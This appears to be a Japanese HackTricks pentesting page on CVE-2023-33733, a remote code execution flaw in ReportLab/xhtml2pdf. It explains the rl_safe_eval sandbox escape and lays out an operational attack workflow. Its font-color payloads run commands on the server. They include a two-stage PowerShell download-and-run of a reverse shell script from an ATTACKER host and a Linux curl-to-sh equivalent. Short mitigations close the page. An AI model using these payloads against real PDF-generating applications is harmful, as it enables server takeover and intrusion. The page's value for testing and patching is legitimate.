# ReportLab/xhtml2pdf [[[...]]] 式評価 RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

このページは、ReportLab の rl_safe_eval（xhtml2pdf やその他の PDF 生成パイプラインでユーザー制御の HTML を PDF にレンダリングする際に使用）に存在する実用的なサンドボックス脱出および RCE プリミティブについてまとめたものです。

CVE-2023-33733 は ReportLab のバージョン 3.6.12 まで（含む）に影響します。特定の属性コンテキスト（例: color）では、triple brackets [[[ ... ]]] で囲まれた値が rl_safe_eval によりサーバー側で評価されます。ホワイトリスト化された組み込み関数（pow など）からその関数の __globals__ にピボットするペイロードを作成することで、攻撃者は os モジュールに到達してコマンドを実行できます。

Key points
- Trigger: ReportLab/xhtml2pdf によって解析されるマークアップ内の <font color="..."> 等の評価される属性に [[[ ... ]]] を注入する。
- Sandbox: rl_safe_eval は危険な組み込みを置換するが、評価された関数は依然として __globals__ を公開している。
- Bypass: rl_safe_eval の名前チェックを回避し、ブロックされた dunder フィルタリングを避けつつ文字列 "__globals__" にアクセスするための一時的なクラス Word を作成する。
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stability: 実行後に属性が有効な値を返すようにする（color の場合は and 'red' を使うなど）。

When to test
- HTML を PDF にエクスポートできるアプリケーション（プロフィール、請求書、レポート等）で、PDF メタデータや HTTP レスポンスのコメントに xhtml2pdf/ReportLab が表示される場合。
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" が Producer に表示される
- PDF の HTTP レスポンスはしばしば ReportLab の generator コメントで始まる

How the sandbox bypass works
- rl_safe_eval は多くの組み込み（getattr, type, pow, ...）を削除または置換し、名前が __ で始まるものや拒否リストに載る属性を拒否する名前フィルタを適用する。
- しかし、safe な関数は func.__globals__ のようなグローバル辞書に格納されている。
- type(type(1)) を使って実際の組み込み type 関数を回復し（ReportLab のラッパーを回避）、比較挙動を変えた str 継承の Word クラスを定義することで次を実現する:
  - .startswith('__') → 常に False（名前 startswith('__') チェックを回避）
  - .__eq__ は最初の比較のみ False を返し（denylist メンバーチェックを回避）、その後は True を返す（Python の getattr が動作するように）
  - .__hash__ が hash(str(self)) と等しい
- これにより getattr(pow, Word('__globals__')) はラップされた pow 関数の globals 辞書を返し、その中に読み込まれた os モジュールが含まれる。あとは ['os'].system('<cmd>')。

Minimal exploitation pattern (attribute example)
評価される属性の内部にペイロードを置き、boolean と 'red' を使って属性が有効な値を返すようにする。

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- リスト内包表現の形式にすることで、rl_safe_eval が受け入れる単一式に収めている。
- 最後の and 'red' により有効な CSS color を返すため、レンダリングが壊れない。
- コマンドは必要に応じて置き換える。実行確認には tcpdump と ping を併用する。

Operational workflow
1) PDF ジェネレータを特定する
- PDF Producer が xhtml2pdf を示す; HTTP レスポンスに ReportLab コメントが含まれる。
2) PDF に反映される入力箇所を見つける（例: profile bio/description）とエクスポートをトリガーする。
3) 低ノイズな ICMP で実行を検証する
- 実行例: sudo tcpdump -ni <iface> icmp
- ペイロード例: ... system('ping <your_ip>') ...
- Windows は既定で正確に 4 回の echo request を送ることが多い。
4) シェルの確立
- Windows 向けには、クォート/エンコーディング問題を避けるため信頼できる 2 ステージ手法が有効:
- Stage 1 (ダウンロード):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (実行):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Linux ターゲット向けには curl/wget を使った類似の 2 ステージも可能:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Notes and tips
- 属性コンテキスト: color は評価される既知の属性。ReportLab マークアップの他の属性も式を評価する可能性がある。ある箇所がサニタイズされている場合は、PDF フローにレンダリングされる他の場所（異なるフィールド、テーブルのスタイル等）を試す。
- クォーティング: コマンドはできるだけ簡潔に。2 ステージのダウンロードはクォートやエスケープの問題を大幅に減らす。
- 信頼性: エクスポートがキャッシュ或いはキュー化されている場合、キャッシュ回避のためにペイロードを少し変える（ランダムなパスやクエリを追加）こと。

Mitigations and detection
- ReportLab を 3.6.13 以降にアップグレードする（CVE-2023-33733 は修正済み）。ディストリビューションのパッケージセキュリティアドバイザリも追跡すること。
- ユーザー制御の HTML/マークアップを xhtml2pdf/ReportLab に直接渡さない。信頼できない入力に対しては厳格なサニタイズを行い、[[[...]]] の評価構文やベンダー固有タグを削除/拒否する。
- 信頼できない入力に対しては rl_safe_eval の使用を無効化するかラップすることを検討する。
- PDF 生成時の疑わしいアウトバウンド接続（アプリサーバーからの ICMP/HTTP 等）を監視する。

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
